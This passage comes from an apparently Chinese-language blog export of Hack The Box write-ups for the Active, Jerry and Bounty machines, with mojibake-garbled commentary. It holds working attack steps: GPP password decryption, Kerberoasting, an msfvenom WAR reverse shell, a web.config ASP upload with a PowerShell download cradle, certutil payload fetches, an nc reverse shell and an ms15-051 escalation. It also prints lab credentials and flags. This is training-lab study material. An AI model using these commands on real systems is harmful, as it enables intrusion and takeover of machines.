OS:05NW8ST11%O5=M505NW8ST11%O6=M505ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000 OS:%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M505NW8NNS%CC=N%Q=)T1(R=Y%DF OS:=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0% OS:Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A OS:%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y OS:%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU OS:D=G)IE(R=Y%DFI=N%T=80%CD=Z) Network Distance: 2 hops Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2022-04-22T06:58:32 |_ start_date: 2022-04-22T06:55:19 TRACEROUTE (using port 1025/tcp) HOP RTT ADDRESS 1 316.49 ms 10.10.14.1 2 316.60 ms 10.10.10.100 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 216.91 seconds Smbè¿™é‡Œçœ‹åˆ°æœ‰ smbï¼Œå»æŸ¥çœ‹ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# smbmap -H 10.10.10.100 [+] IP: 10.10.10.100:445 Name: 10.10.10.100 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default shar IPC$ NO ACCESS Remote IPC NETLOGON NO ACCESS Logon server Replication READ ONLY SYSVOL NO ACCESS Logon server Users NO ACCESS è¿™é‡Œæœ‰ä¸€ä¸ª Replication ç›®å½•æ˜¯å¯ä»¥æŸ¥çœ‹çš„ï¼Œå»çœ‹ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# smbclient //10.10.10.100/Replication Enter WORKGROUP\\root&#39;s password: Anonymous login successful Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; dir . D 0 Sat Jul 21 06:37:44 2018 .. D 0 Sat Jul 21 06:37:44 2018 active.htb D 0 Sat Jul 21 06:37:44 2018 5217023 blocks of size 4096. 249292 blocks available æœ‰ä¸ª active.htb æ–‡ä»¶å¤¹ï¼Œç»™ä¸‹è½½ä¸‹æ¥ recurse ON prompt OFF mget * active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml åœ¨ä¸Šé¢è¿™ä¸ªæ–‡ä»¶ä¸­æ‰¾åˆ°äº†ä¸€ä¸ªè´¦å·å’Œå¯†ç  &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\\SVC_TGS&quot;/&gt;&lt;/User&gt; &lt;/Groups&gt; username = active.htb\\SVC_TGS cpassword = edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVm æ¼æ´åˆ©ç”¨ä½¿ç”¨ kali è‡ªå¸¦çš„ gpp-decrypt è¿›è¡Œè§£å¯† â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ GPPstillStandingStrong2k18 username = SVC_TGS password = GPPstillStandingStrong2k18 ç°åœ¨æˆ‘ä»¬æœ‰äº†è´¦å·å¯†ç ï¼Œç»§ç»­å» smb é‡ŒæŸ¥çœ‹æ–‡ä»¶ smbclient //10.10.10.100/Users -U SVC_TGS%GPPstillStandingStrong2k18 smb: \\&gt; dir . DR 0 Sat Jul 21 10:39:20 2018 .. DR 0 Sat Jul 21 10:39:20 2018 Administrator D 0 Mon Jul 16 06:14:21 2018 All Users DHSrn 0 Tue Jul 14 01:06:44 2009 Default DHR 0 Tue Jul 14 02:38:21 2009 Default User DHSrn 0 Tue Jul 14 01:06:44 2009 desktop.ini AHS 174 Tue Jul 14 00:57:55 2009 Public DR 0 Tue Jul 14 00:57:55 2009 SVC_TGS D 0 Sat Jul 21 11:16:32 2018 5217023 blocks of size 4096. 279115 blocks available ä¼¼ä¹ç›´æ¥å°±è¿›ç³»ç»Ÿäº†ï¼Œå»æ‰¾æ‰¾çœ‹æœ‰æ²¡æœ‰æœ‰ä»·å€¼çš„æ–‡ä»¶ cd SVC_TGS\\Desktop\\ get user.txt â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# cat user.txt a8644850ef3290ae34457a8ad9982d5e æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡è¿™å°æœºå™¨çš„ 88 ç«¯å£è¿è¡Œç€ k8s(kerberos)ï¼Œå’±ä»¬å¯ä»¥ç”¨ impacket æ¥è¿›è¡Œåˆ©ç”¨ https://github.com/SecureAuthCorp/impacket æ¥ç€æŠŠè¿™å°é¶æœºåŠ å…¥åˆ° hostsé‡Œ echo 10.10.10.100 active.htb &gt;&gt; /etc/hosts ç„¶åä½¿ç”¨è¿™ä¸ªå·¥å…· python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/impacket/examples] â””â”€# python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 Impacket v0.9.25.dev1+20220420.234604.17ae0913 - Copyright 2021 SecureAuth Corporation ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 15:06:40.351723 2022-04-22 02:56:29.468554 [-] CCache file is not found. Skipping... $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$65399e5d81a676e87013d1d2c95a9919$831e286d069ed4766f092217ea7ed3e87d62dd0d864b137ef449c0fe02bd6d418c6ea56c01254956638d0b0e6f9868bab37574dc0bdc29f47106d8d4f96d9f87ceb62920f566339adfc5ec5d2761a97a7843be5b750a38b8f0aa42f67b3c1dd909fa1832796d43b2be9830c78450c46802a3c266a0000d0c898b003edbe894fc11e4746382b5a422e04fa23096c50d3330fa9bcae382771bcc528c090c245327d968f1bb06f345dc2d44cf92624eea731e7467f5a6dfb6c90d016bc716de3ba2128a428e7d0b4529dcad6a4d59b1780f7ef863580a1e56348eb12cb865e21c5ce047d289762b0c2ae694db3ffed75416c9cda974a3e4ca591cf25288a0278d4ff4e971013e74c5dcb2321e6b228de3617ed8f53705443dfa858d732f39df31d153ea5dfed178961933883613c692856a381c68f00a7821f77682b9d303a0c7e9af9f24cb6de1ccb5a1d74b7de0d3952669f4ea1d730a5cfabe52a970a6d38013934bea4cc175c2cdcb0da52087fb5599a769e8f50c90535c46e28a081791eb56377d67eb9b8334e89c15c25268ad9af9cea1b4d44cbd3eb5c5d431bab1aabe922fa75af954ec75b024351dd1d22a2df3d2d9f968d191fd456062f22e11c6af3d64ca9ee0bae77f933e5e1879f9f45b50e88a6de5278fffcdc20a99fde8e6e305b3bb213584d5c047df73f432386500dde52cfc1fc277399979a8b5955008aad50cbcfa359ddd6d634b99064663a49a2f477b4d2d8d21ffd8fdf9ccc43b10db9b58964e198444881f96ce700c9dc6cb6c4192274cd7e52c7340f2c052909a9bc78e6dee1b7758f07ac32154d3f4fd01fa776520c514de5e6c3ba53ea0b2c81d9e8c1d0124b3467610038423bd14dbdbc863ddc9d0dfd8d768a3682ee7da66d38c3e7d31937c1eb5813d4997377649be0b14487de5cf23be190c7f20cec1f47afa101829fbf3e12320481ca79f6254e2462dadae248020ed5b0bfff84367f33f101f734ff5727eaa101a4faaeadf267d20b3211583d7794c0892a62b6dc25caafc96c17f21ef1585aa6b95b89aa831a22959e145b490364aa28c42ea79763a1db3ef5159558e6898faaf40e5757e3d7889308ec79ae1d2d721ea98b2e79914d85380c4385d62ee308caa77982c84eaaccc84b19cc69d16b4ae471b270b66c02b16f450c109e58cd5e524d20b092c62ce573115d204825121da3913418a596157b6274c3ac653d352f10983b08046de6e3ab6715169dbf250bf0212 æŠŠè¿™æ®µ hash ä¿å­˜ä¸‹æ¥ï¼Œç„¶åä½¿ç”¨ hashcat è¿›è¡Œçˆ†ç ´ hashcat hash /usr/share/wordlists/rockyou.txt -m 13100 Ticketmaster1968 â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/impacket/examples] â””â”€# python3 psexec.py Administrator:Ticketmaster1968@10.10.10.100 1 âš™ Impacket v0.9.25.dev1+20220420.234604.17ae0913 - Copyright 2021 SecureAuth Corporation [*] Requesting shares on 10.10.10.100..... [*] Found writable share ADMIN$ [*] Uploading file CahMAAGa.exe [*] Opening SVCManager on 10.10.10.100..... [*] Creating service jzgq on 10.10.10.100..... [*] Starting service jzgq..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt; whoami nt authority\\system æˆåŠŸæ‹¿åˆ° root æƒé™çš„ shell c:\\Users\\Administrator\\Desktop&gt; type root.txt d7a6880e1ed8648dcb9012f911819322 æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Jerry - Hackthebox","slug":"Hackthebox - Jerry","date":"2022-04-23T11:38:36.000Z","updated":"2023-05-20T01:55:17.000Z","comments":true,"path":"2022/04/23/Hackthebox - Jerry/","link":"","permalink":"http://www.lucifiel.com/2022/04/23/Hackthebox%20-%20Jerry/","excerpt":"","text":"Hackthebox - Jerryé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.95 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-22 02:03 EDT Nmap scan report for 10.10.10.95 Host is up (0.33s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-favicon: Apache Tomcat |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2012|2008|Vista|7 (91%) OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_7 Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 (90%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%), Microsoft Windows 7 Professional (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops TRACEROUTE (using port 8080/tcp) HOP RTT ADDRESS 1 333.58 ms 10.10.14.1 2 334.33 ms 10.10.10.95 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 61.70 seconds Httpè¿™é‡Œåªæœ‰ä¸€ä¸ª 8080 ç«¯å£ï¼Œå»è®¿é—®ä¸€ä¸‹çœ‹çœ‹ æ˜¯ä¸€ä¸ª tomcat çš„é¡µé¢ï¼Œå°è¯•ä¸€ä¸‹å¼±å£ä»¤ç™»å½• æ¼æ´åˆ©ç”¨ ä½¿ç”¨å¼±å£ä»¤ admin&#x2F;admin æˆåŠŸç™»å½•ï¼Œä½†æ˜¯è¿™é‡Œå´æ²¡æœ‰çœ‹åˆ°ä¸Šä¼ ç‚¹ï¼Œæˆ‘æ€€ç–‘ä¸å¤ªå¯¹ï¼Œå› ä¸ºtomcat çš„ ç™»å½•å¯†ç ä¸€èˆ¬æ˜¯ tomcat åœ¨è¾“å…¥å¯†ç çš„æ—¶å€™é€‰æ‹©å–æ¶ˆï¼Œç„¶ååœ¨é”™è¯¯é¡µé¢ä¸­å¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç  username = tomcat password = s3cret è¿™æ¬¡æƒé™å°±å¯¹äº†ï¼Œç„¶åä½¿ç”¨ msfvenom å»ç”Ÿæˆä¸€ä¸ª war é©¬ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war &gt; shell.war ç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 ä¸Šä¼ åå»è®¿é—®ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.95] 49193 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\apache-tomcat-7.0.88&gt;whoami whoami nt authority\\system æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shell c:\\Users\\Administrator\\Desktop\\flags&gt;type &quot;2 for the price of 1.txt&quot; type &quot;2 for the price of 1.txt&quot; user.txt 7004dbcef0f854e0fb401875f26ebd00 root.txt 04a8b36e1545a455393d067e772fe90e æ‹¿åˆ° user å’Œ root æƒé™çš„ flag æ–‡ä»¶ï¼Œå€’æ˜¯ä¸ç”¨ææƒäº†","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Bounty - Hackthebox","slug":"Hackthebox - Bounty","date":"2022-04-22T11:38:36.000Z","updated":"2023-05-20T01:25:28.000Z","comments":true,"path":"2022/04/22/Hackthebox - Bounty/","link":"","permalink":"http://www.lucifiel.com/2022/04/22/Hackthebox%20-%20Bounty/","excerpt":"","text":"Hackthebox - Bountyé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.93 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-20 16:39 CST Nmap scan report for 10.10.10.93 Host is up (0.38s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: Bounty Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%) OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012 Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 342.38 ms 10.10.16.1 2 513.76 ms 10.10.10.93 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 57.51 seconds Http http é‡Œä¹Ÿæ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œå» fuzz ä¸€ä¸‹çœ‹çœ‹ Fuzzâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~] â””â”€# gobuster dir -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.93/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/04/20 16:44:18 Starting gobuster in directory enumeration mode =============================================================== /UploadedFiles (Status: 301) [Size: 156] [--&gt; http://10.10.10.93/UploadedFiles/] =============================================================== 2022/04/20 16:47:53 Finished =============================================================== æœ‰ä¸€ä¸ªç›®å½•ï¼Œè®¿é—®ä¸€ä¸‹ 403 äº†ï¼Œé€šè¿‡ nmap å¾—çŸ¥è¿™æ˜¯ windows ç³»ç»Ÿä¸‹çš„ iis æ­å»ºçš„ç½‘ç«™ï¼Œè®©æˆ‘ä»¬å°è¯•ä¸€ä¸‹ç”¨ -x æ‰«æ aspx æ ¼å¼çš„ç½‘é¡µ â”Œâ”€â”€(rootğŸ’€lucifiel)-[~] â””â”€# gobuster dir -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 500 --no-error -x aspx =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.93/ [+] Method: GET [+] Threads: 500 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: aspx [+] Timeout: 10s =============================================================== 2022/04/20 16:57:38 Starting gobuster in directory enumeration mode =============================================================== /transfer.aspx (Status: 200) [Size: 941] =============================================================== 2022/04/20 16:59:36 Finished =============================================================== æˆ‘ä»¬æ‰«æåˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢ éšä¾¿ä¸Šä¼ å¼ å›¾ç‰‡è¯•è¯•çœ‹ è¿™é‡Œæ˜¾ç¤ºä¸Šä¼ æˆåŠŸï¼Œå»è®¿é—®ä¸€ä¸‹çœ‹çœ‹èƒ½ä¸èƒ½è®¿é—®åˆ° å¯ä»¥è®¿é—®åˆ°ï¼Œä½†æ˜¯å¤§æ¦‚ä¸€åˆ†é’Ÿå·¦å³å°±ä¼šè¢«è‡ªåŠ¨åˆ é™¤ å°è¯•ä¸Šä¼ äº†ä¸€ä¸ªaspxæ–‡ä»¶ï¼Œè¿™æ¬¡ä¸Šä¼ å¤±è´¥äº† å»æœäº†ä¸€ä¸‹ç›¸å…³çš„æ¼æ´ï¼Œå€’æ˜¯æœåˆ°äº†ä¸€äº›æ¼æ´ https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/ å»åˆ©ç”¨å§ æ¼æ´åˆ©ç”¨&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;configuration&gt; &lt;system.webServer&gt; &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt; &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\\system32\\inetsrv\\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt; &lt;/handlers&gt; &lt;security&gt; &lt;requestFiltering&gt; &lt;fileExtensions&gt; &lt;remove fileExtension=&quot;.config&quot; /&gt; &lt;/fileExtensions&gt; &lt;hiddenSegments&gt; &lt;remove segment=&quot;web.config&quot; /&gt; &lt;/hiddenSegments&gt; &lt;/requestFiltering&gt; &lt;/security&gt; &lt;/system.webServer&gt; &lt;/configuration&gt; &lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes! &lt;% Response.write(&quot;-&quot;&amp;&quot;-&gt;&quot;) &#39; it is running the ASP code if you can see 3 by opening the web.config file! Response.write(1+2) Response.write(&quot;&lt;!-&quot;&amp;&quot;-&quot;) %&gt; --&gt; å°†è¿™æ®µæ–‡ä»¶ä»£ç ä¿å­˜ä¸º web.config ç„¶åä¸Šä¼ ï¼Œå»æŸ¥çœ‹åå¦‚æœçœ‹åˆ°äº† â€œ3â€ åˆ™è¡¨ç¤º payload è¢«æ‰§è¡Œäº† ç¡®å®æ‰§è¡ŒæˆåŠŸäº† &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;configuration&gt; &lt;system.webServer&gt; &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt; &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\\system32\\inetsrv\\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt; &lt;/handlers&gt; &lt;security&gt; &lt;requestFiltering&gt; &lt;fileExtensions&gt; &lt;remove fileExtension=&quot;.config&quot; /&gt; &lt;/fileExtensions&gt; &lt;hiddenSegments&gt; &lt;remove segment=&quot;web.config&quot; /&gt; &lt;/hiddenSegments&gt; &lt;/requestFiltering&gt; &lt;/security&gt; &lt;/system.webServer&gt; &lt;/configuration&gt; &lt;!-- &lt;% Set rs = CreateObject(&quot;WScript.Shell&quot;) Set cmd = rs.Exec(&quot;cmd /c whoami&quot;) o = cmd.StdOut.readall() Response.write(o) %&gt; --&gt; ä¿®æ”¹ä¸€ä¸ª POCï¼Œç„¶åä¸Šä¼  è¿™é‡ŒæˆåŠŸè¿”å›äº†æˆ‘ä»¬è¦çš„ä¸œè¥¿ æ¥æ˜ç¡®ä¸€ä¸‹æ”»å‡»è·¯å¾„ Step 1ä½¿ç”¨ nishang æ¥è¿›è¡Œ getshell https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 ç„¶ååœ¨æœ€åä¸€è¡ŒåŠ å…¥ä¸‹é¢çš„ä»£ç  Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444 Step 2ç„¶åæ„é€ å¥½ web.config ä¸­çš„è¯­å¥ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;configuration&gt; &lt;system.webServer&gt; &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt; &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\\system32\\inetsrv\\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt; &lt;/handlers&gt; &lt;security&gt; &lt;requestFiltering&gt; &lt;fileExtensions&gt; &lt;remove fileExtension=&quot;.config&quot; /&gt; &lt;/fileExtensions&gt; &lt;hiddenSegments&gt; &lt;remove segment=&quot;web.config&quot; /&gt; &lt;/hiddenSegments&gt; &lt;/requestFiltering&gt; &lt;/security&gt; &lt;/system.webServer&gt; &lt;/configuration&gt; &lt;!-- &lt;% Set rs = CreateObject(&quot;WScript.Shell&quot;) Set cmd = rs.Exec(&quot;cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.2/Invoke-PowerShellTcp.ps1&#39;)&quot;) o = cmd.StdOut.readall() Response.write(o) %&gt; --&gt; ç„¶åä½¿ç”¨ nc åœ¨æœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 æ¥ç€ä½¿ç”¨ python3 å¼€å¯ä¸€ä¸ª http æœåŠ¡ python3 -m http.server 80 Step 3ä¸Šä¼ å¹¶è®¿é—®æˆ‘ä»¬çš„ payload â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.93] 49158 Windows PowerShell running as user BOUNTY$ on BOUNTY Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\windows\\system32\\inetsrv&gt;whoami bounty\\merlin æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shell æƒé™æå‡ä½¿ç”¨ systeminfo æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿä¿¡æ¯ PS C:\\windows\\system32\\inetsrv&gt; systeminfo Host Name: BOUNTY OS Name: Microsoft Windows Server 2008 R2 Datacenter OS Version: 6.1.7600 N/A Build 7600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 55041-402-3606965-84760 Original Install Date: 5/30/2018, 12:22:24 AM System Boot Time: 4/22/2022, 6:08:06 AM System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 1 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul Total Physical Memory: 2,047 MB Available Physical Memory: 28 MB Virtual Memory: Max Size: 4,095 MB Virtual Memory: Available: 1,786 MB Virtual Memory: In Use: 2,309 MB Page File Location(s): C:\\pagefile.sys Domain: WORKGROUP Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) PRO/1000 MT Network Connection Connection Name: Local Area Connection DHCP Enabled: No IP address(es) [01]: 10.10.10.93 æ²¡æœ‰è¡¥ä¸ï¼Œé‚£å°±ç›´æ¥ ms15-051 ææƒäº† https://github.com/wikiZ/ms15--051 https://github.com/vinsworldcom/NetCat64/releases/tag/1.11.6.4 è¿™é‡Œçš„ shell ä¸å¤ªç¨³å®šï¼Œå’±ä»¬å…ˆä½¿ç”¨ msf è·å–ä¸€ä¸ª shell å§ ç„¶åå’±ä»¬ä½¿ç”¨ shell æ‰§è¡Œä¸‹é¢ä¸¤æ¡å‘½ä»¤ cd c:\\users\\merlin\\desktop certutil -urlcache -split -f http://10.10.14.2/ms15-051.exe certutil -urlcache -split -f http://10.10.14.2/nc64.exe ./ms15-051.exe &quot;./nc64.exe 10.10.14.2 5555 -e cmd.exe&quot; ç„¶åä½¿ç”¨ msf å¼€å¯ç›‘å¬ use exploit/multi/handler set lhost 10.10.14.2 exploit ç„¶åæ‰§è¡Œæ–‡ä»¶ &amp;&quot;C:\\users\\merlin\\Desktop\\shell.exe&quot; â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 1 â¨¯ listening on [any] 4444 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.93] 49181 Windows PowerShell running as user BOUNTY$ on BOUNTY Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32&gt;whoami nt authority\\system æˆåŠŸå¾—åˆ° root æƒé™çš„ shell PS C:\\Windows\\system32&gt; type c:/users/merlin/desktop/user.txt 66aee8a564d37a25796466f0699d7e8a PS C:\\Windows\\system32&gt; type c://users/administrator/desktop/root.txt a376f4044a2bd073ed0abf33f3b659f4 æˆåŠŸå¾—åˆ° user å’Œ root æƒé™çš„ flag æ–‡ä»¶ å…¶ä»–å¦‚æœ ms15-051 ä¸€ç›´å¡é¡¿ï¼Œé‚£å¯ä»¥è¯•è¯• juicy-potato https://github.com/ohpe/juicy-potato","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Sunday - Hackthebox","slug":"Hackthebox - 